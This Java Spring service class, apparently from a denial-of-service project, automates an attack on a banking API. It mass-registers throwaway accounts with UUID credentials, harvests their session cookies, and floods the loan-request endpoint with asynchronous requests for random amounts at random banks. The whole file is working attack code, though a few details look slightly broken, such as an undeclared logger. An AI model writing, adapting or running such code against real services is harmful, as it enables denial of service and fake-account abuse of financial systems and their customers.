package com.mahdiyar.dosattack.service;

import com.google.common.collect.ImmutableList;
import com.mahdiyar.dosattack.model.RestResponse;
import com.mahdiyar.dosattack.model.dto.bank.BankDto;
import com.mahdiyar.dosattack.model.dto.loan.LoanDto;
import com.mahdiyar.dosattack.model.dto.request.loan.LoanRequestDto;
import com.mahdiyar.dosattack.model.dto.request.user.LoginRequestDto;
import com.mahdiyar.dosattack.model.dto.request.user.SignupRequestDto;
import com.mahdiyar.dosattack.model.dto.response.user.LoginResponseDto;
import com.mahdiyar.dosattack.model.dto.response.user.SignupResponseDto;
import com.mahdiyar.dosattack.util.Constants;
import javafx.util.Pair;
import lombok.extern.slf4j.Slf4j;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.ParameterizedTypeReference;
import org.springframework.http.*;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.util.List;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * @author Seyyed Mahdiyar Zerehpoush
 */
@Service
@Slf4j
public class BankAttackService {
    private static MessageService messageService = new MessageService();
    private static ConcurrentHashMap<String, Pair<String, String>> usernameWithToken = null;
    private Logger attackLogger = LoggerFactory.getLogger("attack-logger");
    @Autowired
    private RestTemplate loanRequestRestTemplate;
    private static final RestTemplate signupRestTemplate = new RestTemplate();
    private static final RestTemplate loginRestTemplate = new RestTemplate();
    private static final RestTemplate bankRestTemplate = new RestTemplate();
    private static List<BankDto> banks = null;

    public Object bankAttack(int size) throws InterruptedException {
//        Thread.sleep(5000);
        bulkSignupAndLogin(size);
        bulkLoanRequest();
        return null;
    }

    private void bulkLoanRequest() {
        List<CompletableFuture<ResponseEntity<RestResponse<LoanDto>>>> concurrentList = new CopyOnWriteArrayList<>();
        for (Pair<String, String> idAndToken : usernameWithToken.values()) {
            Pair<BankDto, Long> bankAndAmount = chooseRandomBank();
            concurrentList.add(
                    loanRequest(idAndToken.getKey(),
                            bankAndAmount.getKey().getId(),
                            bankAndAmount.getValue(),
                            idAndToken.getValue()));
        }
        CompletableFuture.allOf(concurrentList.toArray(new CompletableFuture[0]));
    }

    private Pair<BankDto, Long> chooseRandomBank() {
        if (banks == null) {
            banks = getBanks();
        }
        Random rnd = new Random(System.currentTimeMillis());
        BankDto bankDto = banks.get(rnd.nextInt(banks.size()));
        Long amount = 10000L + rnd.nextInt();
        return new Pair<>(bankDto, amount);
    }

    @Async
    protected CompletableFuture<ResponseEntity<RestResponse<LoanDto>>> loanRequest(
            String userId, String bankId, Long amount, String authorizationToken) {
        LoanRequestDto loanRequestDto = new LoanRequestDto(userId, bankId, amount);
        HttpEntity httpEntity = new HttpEntity(loanRequestDto);
        HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.add(Constants.COOKIE, Constants.AUTHORIZATION + "=" + authorizationToken);
        ResponseEntity<RestResponse<LoanDto>> loanRequestResponse = loanRequestRestTemplate
                .exchange(
                        Constants.LOAN_REQUEST_URL,
                        HttpMethod.POST,
                        httpEntity,
                        new ParameterizedTypeReference<RestResponse<LoanDto>>() {
                        }
                );
        return CompletableFuture.completedFuture(loanRequestResponse);
    }

    private List<BankDto> getBanks() {

        ResponseEntity<RestResponse<List<BankDto>>> getBanksResponse = bankRestTemplate
                .exchange(
                        Constants.GET_BANKS_URL,
                        HttpMethod.POST,
                        null,
                        new ParameterizedTypeReference<RestResponse<List<BankDto>>>() {
                        }
                );
        if (getBanksResponse.getStatusCode().equals(HttpStatus.OK) && getBanksResponse.getBody() != null && getBanksResponse.getBody().getCode() == 0 && getBanksResponse.getBody().getContent() != null)
            return getBanksResponse.getBody().getContent();
        else return ImmutableList.of();
    }

    private void bulkSignupAndLogin(int count) {
        usernameWithToken = new ConcurrentHashMap<>(count);

        for (int i = 0; i < count; i++) {
            UUID uuid = UUID.randomUUID();
            try {
                ResponseEntity<RestResponse<SignupResponseDto>> signupResponse = signup(uuid.toString(), uuid.toString());
                boolean isOk = handleSignup(signupResponse);
                if (!isOk)
                    continue;
                ResponseEntity<RestResponse<LoginResponseDto>> loginResponse = login(uuid.toString(), uuid.toString());
                isOk = handleLogin(loginResponse);
                if (!isOk)
                    continue;
                usernameWithToken.put(
                        uuid.toString(),
                        new Pair<>(
                                loginResponse.getBody().getContent().getId(),
                                extractAuthorizationToken(loginResponse)));
            } catch (Exception ex) {
                logger.error("error in signup/login for user with username : {}", uuid.toString(), ex);
            }
        }
    }

    private String extractAuthorizationToken(ResponseEntity<RestResponse<LoginResponseDto>> loginResponse) {
        String authorizationHeader = loginResponse.getHeaders().getFirst(HttpHeaders.SET_COOKIE);
        if (authorizationHeader == null || !authorizationHeader.contains(Constants.AUTHORIZATION + "="))
            throw new IllegalStateException();
        return authorizationHeader.replace(Constants.AUTHORIZATION + "=", "");
    }

    private boolean handleLogin(ResponseEntity<RestResponse<LoginResponseDto>> loginResponse) {
        return loginResponse.getStatusCode().equals(HttpStatus.OK) && loginResponse.getBody() != null && loginResponse.getBody().getCode() == 0 && loginResponse.getBody().getContent() != null;
    }

    private ResponseEntity<RestResponse<LoginResponseDto>> login(String username, String password) {
        LoginRequestDto requestDto = new LoginRequestDto();
        requestDto.setUsername(username);
        requestDto.setPassword(password);
        HttpEntity<LoginRequestDto> requestEntity = new HttpEntity<>(requestDto);
        return loginRestTemplate
                .exchange(
                        Constants.LOGIN_URL,
                        HttpMethod.POST,
                        requestEntity,
                        new ParameterizedTypeReference<RestResponse<LoginResponseDto>>() {
                        }
                );
    }

    private boolean handleSignup(ResponseEntity<RestResponse<SignupResponseDto>> signupResponse) {
        return signupResponse.getStatusCode().equals(HttpStatus.OK) && signupResponse.getBody() != null && signupResponse.getBody().getCode() == 0 && signupResponse.getBody().getContent() != null;
    }

    private ResponseEntity<RestResponse<SignupResponseDto>> signup(String username,
                                                                   String password) {
        SignupRequestDto requestDto = new SignupRequestDto();
        requestDto.setUsername(username);
        requestDto.setPassword(password);
        HttpEntity<SignupRequestDto> requestEntity = new HttpEntity<>(requestDto);
        return signupRestTemplate
                .exchange(
                        Constants.SIGNUP_URL,
                        HttpMethod.POST,
                        requestEntity,
                        new ParameterizedTypeReference<RestResponse<SignupResponseDto>>() {
                        }
                );
    }
}
